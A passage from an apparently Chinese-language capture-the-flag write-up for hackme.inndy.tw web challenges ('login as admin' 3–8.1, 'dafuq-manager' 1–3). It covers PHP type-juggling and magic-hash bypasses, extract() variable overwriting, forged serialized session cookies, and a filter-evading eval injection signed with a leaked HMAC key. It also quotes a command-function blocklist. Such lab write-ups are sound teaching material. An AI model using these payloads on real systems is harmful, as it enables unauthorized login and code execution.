class="symbol">NGE2</span>ODI<span class="number">0</span>MmRiODY<span class="number">5</span><span class="symbol">NjAzMDUwNTI3</span>Mzkx<span class="symbol">NGRlZDY4</span>OGQ<span class="number">0</span><span class="symbol">NTllOGM5</span>MjI<span class="number">1</span>MjAwZDcyOWEwYjk<span class="number">4</span>ZSIsImRhdGEiOiJbXCJ<span class="symbol">ndWVzdFwiLGZhbHNlXSJ9</span></span><br><span class="line"></span><br><span class="line">base<span class="number">64</span>_decode =&gt;</span><br><span class="line">&#123;<span class="string">"sig"</span>:<span class="string">"75d53f97acd211098a052b305d1caf191436c6d29d1936d947f8fde7733008a3968edaa4b4a68242db8696030505273914ded688d459e8c9225200d729a0b98e"</span>,<span class="string">"data"</span>:<span class="string">"[\"guest\",false]"</span>&#125;</span><br></pre></td></tr></table></figure><p><code>hmac</code> 验证 <code>data</code> 是否被篡改，可惜用的是 <code>!=</code> ，将自动进行类型转换，我们将 <code>sig</code> 的值设为 0 即可。</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"sig"</span>:<span class="number">0</span>,<span class="string">"data"</span>:<span class="string">"[\"</span><span class="number">1</span>\<span class="string">",1]"</span>&#125;  // 第二个值为 <span class="literal">true</span> 即可</span><br><span class="line"></span><br><span class="line"><span class="attr">base64_encode</span> =&gt;</span><br><span class="line"><span class="attr">eyJzaWciOjAsImRhdGEiOiJbXCIxXCIsMV0ifQ==</span></span><br><span class="line"></span><br><span class="line">需要注意的是，这里 data 里的值也不能完全瞎弄，hash 结果如果以数字开头，则过不了，以字母开头才能过 <span class="keyword">if</span></span><br></pre></td></tr></table></figure><h2 id="login-as-admin-4"><a href="#login-as-admin-4" class="headerlink" title="login as admin 4"></a><a href="https://hackme.inndy.tw/login4" target="_blank" rel="noopener">login as admin 4</a></h2><p>这一块有逻辑问题。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>($_POST[<span class="string">'name'</span>] === <span class="string">'admin'</span>): <span class="comment">/* login success! */</span> <span class="meta">?&gt;</span></span><br><span class="line">      &lt;div class="alert alert-success"&gt;&lt;code&gt;&lt;?=$flag?&gt;&lt;/code&gt;&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="login-as-admin-6"><a href="#login-as-admin-6" class="headerlink" title="login as admin 6"></a><a href="https://hackme.inndy.tw/login6" target="_blank" rel="noopener">login as admin 6</a></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(E_ALL^E_NOTICE);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'data'</span>])) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $data = json_decode($_POST[<span class="string">'data'</span>], <span class="keyword">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        $data = [];</span><br><span class="line">    &#125;</span><br><span class="line">    extract($data);</span><br><span class="line">    <span class="comment">// 变量覆盖</span></span><br><span class="line">    <span class="keyword">if</span>($users[$username] &amp;&amp; strcmp($users[$username], $password) == <span class="number">0</span>) &#123;</span><br><span class="line">        $user = $username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(!$user &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'data'</span>])): <span class="meta">?&gt;</span></span><br><span class="line">            &lt;div class="alert alert-danger"&gt;Login failed&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span></span><br><span class="line">            &lt;h3&gt;Hi, <span class="meta">&lt;?</span>=htmlentities($username)<span class="meta">?&gt;</span>&lt;/h3&gt;</span><br><span class="line">            &lt;h4&gt;<span class="meta">&lt;?</span>=sprintf(<span class="string">"You %s admin!"</span>, $user == <span class="string">'admin'</span> ? <span class="string">"are"</span> : <span class="string">"are not"</span>)<span class="meta">?&gt;</span>&lt;/h4&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span> <span class="keyword">if</span>($user == <span class="string">'admin'</span>) printf(<span class="string">"&lt;code&gt;%s&lt;/code&gt;"</span>, htmlentities($flag)); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看到 <code>extract</code> 基本上就是变量覆盖的洞了。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">data</span>=&#123;<span class="string">"user"</span>:<span class="string">"admin"</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="login-as-admin-7"><a href="#login-as-admin-7" class="headerlink" title="login as admin 7"></a><a href="https://hackme.inndy.tw/login7" target="_blank" rel="noopener">login as admin 7</a></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'name'</span>] == <span class="string">'admin'</span> &amp;&amp; md5($_POST[<span class="string">'password'</span>]) == <span class="string">'00000000000000000000000000000000'</span>)&#123;</span><br><span class="line">    <span class="comment">// admin account is disabled by give a impossible md5 hash</span></span><br><span class="line">    $user = <span class="string">'admin'</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span>($_POST[<span class="string">'name'</span>] == <span class="string">'guest'</span> &amp;&amp; md5($_POST[<span class="string">'password'</span>]) == <span class="string">'084e0343a0486ff05530df6c705c8bb4'</span>) &#123;</span><br><span class="line">    $user = <span class="string">'guest'</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="keyword">isset</span>($_POST[<span class="string">'name'</span>])) &#123;</span><br><span class="line">    $user = <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>弱类型比较 + 魔法哈希</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="string">'0e0'</span> == <span class="string">'0000'</span>);  <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s1184209335a</span><br><span class="line"><span class="number">0e072485820392773389523109082030</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e73119806149116307319712</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s532378020a</span><br><span class="line"><span class="number">0e220463095855511507588041205815</span></span><br></pre></td></tr></table></figure><h2 id="login-as-admin-8"><a href="#login-as-admin-8" class="headerlink" title="login as admin 8"></a><a href="https://hackme.inndy.tw/login8" target="_blank" rel="noopener">login as admin 8</a></h2><p>给出的核心代码就这些，剩下的要靠自己慢慢找了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">'session.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// class Session &#123; ... &#125;</span></span><br><span class="line"><span class="comment">// sorry, no source code this time. :P</span></span><br><span class="line"></span><br><span class="line">$session = Session::load();</span><br><span class="line">$login_failed = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'debug'</span>] === <span class="string">'1'</span>) &#123;</span><br><span class="line">    $session-&gt;debug();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'name'</span>])) &#123;</span><br><span class="line">    $login_failed = !Session::login($_POST[<span class="string">'name'</span>], $_POST[<span class="string">'password'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'logout'</span>])) &#123;</span><br><span class="line">    $session = <span class="keyword">new</span> Session();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$session-&gt;save();</span><br></pre></td></tr></table></figure><p><code>cookie</code> 里有点东西，<strong>login8cookie</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span><span class="number">%3</span>A7<span class="number">%3</span>A<span class="number">%22</span>Session<span class="number">%22</span><span class="number">%3</span>A6<span class="number">%3</span>A<span class="number">%7</span>Bs<span class="number">%3</span>A14<span class="number">%3</span>A<span class="number">%22</span><span class="number">%00</span>Session<span class="number">%00</span>debug<span class="number">%22</span><span class="number">%3</span>Bb<span class="number">%3</span>A0<span class="number">%3</span>Bs<span class="number">%3</span>A19<span class="number">%3</span>A<span class="number">%22</span><span class="number">%00</span>Session<span class="number">%00</span>debug_dump<span class="number">%22</span><span class="number">%3</span>Bs<span class="number">%3</span>A9<span class="number">%3</span>A<span class="number">%22</span>index.php<span class="number">%22</span><span class="number">%3</span>Bs<span class="number">%3</span>A13<span class="number">%3</span>A<span class="number">%22</span><span class="number">%00</span>Session<span class="number">%00</span>data<span class="number">%22</span><span class="number">%3</span>Ba<span class="number">%3</span>A0<span class="number">%3</span>A<span class="number">%7</span>B<span class="number">%7</span>Ds<span class="number">%3</span>A4<span class="number">%3</span>A<span class="number">%22</span>user<span class="number">%22</span><span class="number">%3</span>Bs<span class="number">%3</span>A0<span class="number">%3</span>A<span class="number">%22</span><span class="number">%22</span><span class="number">%3</span>Bs<span class="number">%3</span>A4<span class="number">%3</span>A<span class="number">%22</span>pass<span class="number">%22</span><span class="number">%3</span>Bs<span class="number">%3</span>A0<span class="number">%3</span>A<span class="number">%22</span><span class="number">%22</span><span class="number">%3</span>Bs<span class="number">%3</span>A8<span class="number">%3</span>A<span class="number">%22</span>is_admin<span class="number">%22</span><span class="number">%3</span>Bb<span class="number">%3</span>A0<span class="number">%3</span>B<span class="number">%7</span>D</span><br></pre></td></tr></table></figure><p><strong>login8sha512</strong></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span>feb<span class="number">33685e47</span><span class="keyword">c</span><span class="number">83</span>ce<span class="number">089</span>b<span class="number">1707</span>f<span class="number">270001</span>a<span class="number">8</span>dc<span class="number">0648</span>d<span class="number">4</span>a<span class="number">7</span>d<span class="number">94</span>d<span class="number">0</span>a<span class="number">3e2</span>f<span class="number">5</span>b<span class="number">35803</span>a<span class="number">7</span><span class="keyword">c</span><span class="number">8766285283415</span><span class="keyword">c</span><span class="number">8594e658468</span>cf<span class="number">5e99</span>be<span class="number">232</span>b<span class="number">3</span>bf<span class="number">98</span>a<span class="number">441568</span>a<span class="number">71</span>f<span class="number">709243e9077</span></span><br></pre></td></tr></table></figure><p>发现，<code>sha512</code> 的值直接是 <code>cookie</code> 的杂凑值，没有加密，没有加盐，同时改就 OK 了。</p><p>需要注意的是，不能 URL 解码后直接复制去 hash，这样会丢失一些不可见字符 <code>%00</code>。</p><h2 id="login-as-admin-8-1"><a href="#login-as-admin-8-1" class="headerlink" title="login as admin 8.1"></a><a href="https://hackme.inndy.tw/login8" target="_blank" rel="noopener">login as admin 8.1</a></h2><blockquote><p>login as admin and grab the hidden flag</p></blockquote><p>注意到上面的 <code>cookie</code> 中还有 <code>debug</code> 选项。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib, urllib.parse</span><br><span class="line">en = <span class="string">"""O%3A7%3A%22Session%22%3A6%3A%7Bs%3A14%3A%22%00Session%00debug%22%3Bb%3A1%3Bs%3A19%3A%22%00Session%00debug_dump%22%3Bs%3A10%3A%22config.php%22%3Bs%3A13%3A%22%00Session%00data%22%3Ba%3A0%3A%7B%7Ds%3A4%3A%22user%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22pass%22%3Bs%3A0%3A%22%22%3Bs%3A8%3A%22is_admin%22%3Bb%3A1%3B%7D"""</span></span><br><span class="line">print(hashlib.sha512((urllib.parse.unquote(en)).encode()).hexdigest())</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2lo6mueh3j20jv08nglt.jpg" alt></p><h2 id="dafuq-manager-1"><a href="#dafuq-manager-1" class="headerlink" title="dafuq-manager 1"></a><a href="https://dafuq-manager.hackme.inndy.tw/" target="_blank" rel="noopener">dafuq-manager 1</a></h2><blockquote><p>Login as guest and find flag 1</p></blockquote><p><code>guest</code> 登录看看，发现是一个文件管理系统，还给了源码。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2lodixl9mj20vf0hn0v5.jpg" alt></p><h2 id="dafuq-manager-2"><a href="#dafuq-manager-2" class="headerlink" title="dafuq-manager 2"></a><a href="https://dafuq-manager.hackme.inndy.tw/" target="_blank" rel="noopener">dafuq-manager 2</a></h2><blockquote><p>Try to login as admin! and you will get flag2</p></blockquote><p>先简单的审计一番，发现并没用到数据库，用户信息是用文件存储的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$GLOBALS[<span class="string">"users"</span>] = <span class="keyword">array</span>(</span><br><span class="line">    <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">"guest"</span>, </span><br><span class="line">        <span class="string">"084e0343a0486ff05530df6c705c8bb4"</span>, </span><br><span class="line">        <span class="string">"./data/guest"</span>, </span><br><span class="line">        <span class="string">"https://game1.security.ntu.st/data/guest"</span>, </span><br><span class="line">        <span class="number">0</span>, </span><br><span class="line">        <span class="string">"^.ht"</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span></span><br><span class="line">    ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>没数据库就不需要考虑 <code>sqli</code> 了，直接想办法读文件。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2m7vaxjiqj20sl07t75a.jpg" alt></p><p>敏感函数大致在这，一个一个看下。</p><p><strong>fun_down.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 判断文件是否存在</span></span><br><span class="line"><span class="keyword">if</span> (!get_is_file($dir, $item)) </span><br><span class="line">    show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"fileexist"</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!get_show_item($dir, $item)) </span><br><span class="line">    show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line"><span class="comment">// 跟进 get_show_item</span></span><br><span class="line"><span class="keyword">if</span> ($item == <span class="string">"."</span> || $item == <span class="string">".."</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"><span class="comment">// 这个判断太弱了，不用管</span></span><br><span class="line"><span class="keyword">if</span> ($GLOBALS[<span class="string">"show_hidden"</span>] == <span class="keyword">false</span>) &#123;  <span class="comment">// show_hidden=1</span></span><br><span class="line">    $dirs = explode(<span class="string">"/"</span>, $dir);</span><br><span class="line">    <span class="keyword">foreach</span> ($dirs <span class="keyword">as</span> $i) <span class="keyword">if</span> (substr($i, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">"."</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 形成完整路径</span></span><br><span class="line">$abs_item = get_abs_item($dir, $item);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里判断了是否有 .php / config，不太好过，再去看看其他点</span></span><br><span class="line"><span class="keyword">if</span> (!file_in_web($abs_item) || stristr($abs_item, <span class="string">'.php'</span>) || stristr($abs_item, <span class="string">'config'</span>)) </span><br><span class="line">    show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br></pre></td></tr></table></figure><p><strong>fun_edit.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里没了之前那个刺头</span></span><br><span class="line"><span class="keyword">if</span> (!get_is_file($dir, $item)) </span><br><span class="line">    show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"fileexist"</span>]);</span><br><span class="line"><span class="keyword">if</span> (!get_show_item($dir, $item)) </span><br><span class="line">    show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line"></span><br><span class="line">$fname = get_abs_item($dir, $item);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!file_in_web($fname)) </span><br><span class="line">    show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br></pre></td></tr></table></figure><p>可以先尝试读取 <code>index.php</code> ，确定好相对路径后再读这个配置文件。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2m8dzr3brj20yo0j3djb.jpg" alt></p><p>用管理员账号登录即可看到 flag。</p><h2 id="dafuq-manager-3"><a href="#dafuq-manager-3" class="headerlink" title="dafuq-manager 3"></a><a href="https://dafuq-manager.hackme.inndy.tw/" target="_blank" rel="noopener">dafuq-manager 3</a></h2><blockquote><p>For flag3, you need a shell to get that. see $WEBROOT/flag3!</p></blockquote><p>之前看源码的时候，留意到一个 <code>debug</code> 的地方，而且也扫出来了 <code>eval</code>。</p><p>定位到 <code>fun_debug.php</code> ，也可以尝试下传个 <code>webshell</code>上去。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_debug</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    assert(strlen($GLOBALS[<span class="string">'secret_key'</span>]) &gt; <span class="number">40</span>);</span><br><span class="line">    $dir = $GLOBALS[<span class="string">'__GET'</span>][<span class="string">'dir'</span>];</span><br><span class="line">    <span class="comment">// 传个数组过了</span></span><br><span class="line">    <span class="keyword">if</span> (strcmp($dir, <span class="string">"magically"</span>) || strcmp($dir, <span class="string">"hacker"</span>) || strcmp($dir, <span class="string">"admin"</span>)) &#123;</span><br><span class="line">        show_error(<span class="string">'You are not hacky enough :('</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">list</span>($cmd, $hmac) = explode(<span class="string">'.'</span>, $GLOBALS[<span class="string">'__GET'</span>][<span class="string">'command'</span>], <span class="number">2</span>);</span><br><span class="line">    $cmd = base64_decode($cmd);</span><br><span class="line">    $bad_things = <span class="keyword">array</span>(<span class="string">'system'</span>, <span class="string">'exec'</span>, <span class="string">'popen'</span>, <span class="string">'pcntl_exec'</span>, <span class="string">'proc_open'</span>, <span class="string">'passthru'</span>, <span class="string">'`'</span>, <span class="string">'eval'</span>, <span class="string">'assert'</span>, <span class="string">'preg_replace'</span>, <span class="string">'create_function'</span>, <span class="string">'include'</span>, <span class="string">'require'</span>, <span class="string">'curl'</span>,);</span><br><span class="line">    <span class="keyword">foreach</span> ($bad_things <span class="keyword">as</span> $bad) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr($cmd, $bad)) &#123;  <span class="comment">// 过滤太弱了</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'2bad'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (hash_equals(hash_hmac(<span class="string">'sha256'</span>, $cmd, $GLOBALS[<span class="string">"secret_key"</span>]), $hmac)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="keyword">eval</span>($cmd));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        show_error(<span class="string">'What does the fox say?'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是命令注入的套路了，咱们弹个 <code>shell</code> 玩玩。 <a href="https://www.anquanke.com/post/id/168667" target="_blank" rel="noopener">如何远程利用PHP绕过Filter以及WAF规则</a></p><p>弹了半天没弹出来，估计做了什么设置，还是老老实实读文件吧。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_command</span><span class="params">($cmd)</span> </span>&#123;</span><br><span class="line">    $hmac = hash_hmac(<span class="string">'sha256'</span>, $cmd, <span class="string">'KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3'</span>);</span><br><span class="line">    <span class="keyword">return</span> sprintf(<span class="string">'%s.%s'</span>, base64_encode($cmd), $hmac);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> make_command(<span class="string">'$a=\'syste\';$b=\'m\';$a.=$b;$a(\'ls -al\');'</span>);</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2mbaypcbqj20yo0cdtav.jpg" alt></p><p>发现 <code>flag3</code> 这个目录，看看里面有啥东西。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2mbd1c4sdj20qs09tgn9.jpg" alt></p><p> <code>root</code> 才能读 <code>flag3</code> ，有点提权的味道了。先看看 <code>meow.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *exec = argv[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *flag = argv[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Usage: %s flag\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"We have cat to read file, And the meow to cat flag."</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">S</span>;</span></span><br><span class="line"><span class="keyword">if</span>(stat(exec, &amp;S) != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Can not stat file %s\n"</span>, exec);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uid_t</span> uid = S.st_uid;</span><br><span class="line"><span class="keyword">gid_t</span> gid = S.st_gid;</span><br><span class="line"></span><br><span class="line">setuid(uid);</span><br><span class="line">seteuid(uid);</span><br><span class="line">setgid(gid);</span><br><span class="line">setegid(gid);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd = open(flag, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd == <span class="number">-1</span>) &#123;</span><br><span class="line"><span 